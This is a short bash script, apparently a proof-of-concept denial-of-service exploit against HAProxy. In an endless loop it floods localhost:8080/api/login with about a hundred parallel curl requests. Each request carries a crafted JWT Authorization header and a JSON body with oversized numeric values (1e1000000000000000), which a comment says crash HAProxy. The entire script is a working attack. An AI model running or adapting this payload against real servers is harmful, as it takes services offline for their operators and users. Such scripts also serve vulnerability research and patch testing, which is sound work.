#!/bin/bash

echo "Denying service..."

for i in {0..100}; do
	# Both the Authorization header and the POST body contain values which crash HAProxy.
	curl localhost:8080/api/login \
		-H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOjFlMTAwMDAwMDAwMDAwMDB9..' \
		-H "Content-Type: application/json" \
		-d "{\"username\":1e1000000000000000}"\
		-s -o /dev/null &
done

while :; do
	wait -n
	curl localhost:8080/api/login \
		-H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOjFlMTAwMDAwMDAwMDAwMDB9..' \
		-H "Content-Type: application/json" \
		-d "{\"username\":1e1000000000000000}"\
		-s -o /dev/null &
done
